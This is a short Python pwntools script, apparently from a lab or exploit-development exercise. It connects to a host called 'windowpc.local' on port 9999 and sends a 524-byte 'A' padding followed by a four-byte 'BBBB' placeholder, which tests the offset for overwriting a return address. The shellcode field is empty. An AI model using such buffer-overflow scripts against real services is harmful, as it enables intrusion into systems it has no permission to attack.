from pwn import *
import warnings

warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

io = remote('windowpc.local', 9999)

offset = 524
padding = 'A' * offset
shellcode = ''
ret = 'B' * 4

payload = padding + ret

io.sendline(payload)
